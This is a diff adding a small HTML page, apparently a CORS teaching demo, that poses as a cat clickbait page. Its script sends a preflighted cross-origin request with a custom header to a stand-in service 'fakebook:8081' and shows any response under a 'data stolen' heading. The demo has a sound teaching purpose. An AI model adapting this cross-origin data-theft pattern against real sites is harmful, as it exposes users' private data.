@@ -1,0 +1,26 @@
+
+<script>
+    request = new XMLHttpRequest();
+    request.open("GET","http://fakebook:8081/fakebook", true);
+    //TODO trouver un meilleur use case
+    request.setRequestHeader("X-Unknown-Header", "my harmful header");
+    request.onreadystatechange = function() {
+        if (this.readyState == 4) {
+            if (this.responseText) {
+                document.getElementById('data-stolen').innerHTML = this.responseText;
+            }
+        }
+    }
+    request.send();
+</script>
+
+<h1>Great ClickBait</h1>
+
+<h3>Top 10 of funniest cats</h3>
+<br/>
+<p>Will try to steal data from Fakebook</p>
+<p>With a preflighted CORS request</p>
+
+
+<h3>Result</h3>
+<p id="data-stolen" style="color: lightcoral">No data stolen</p>
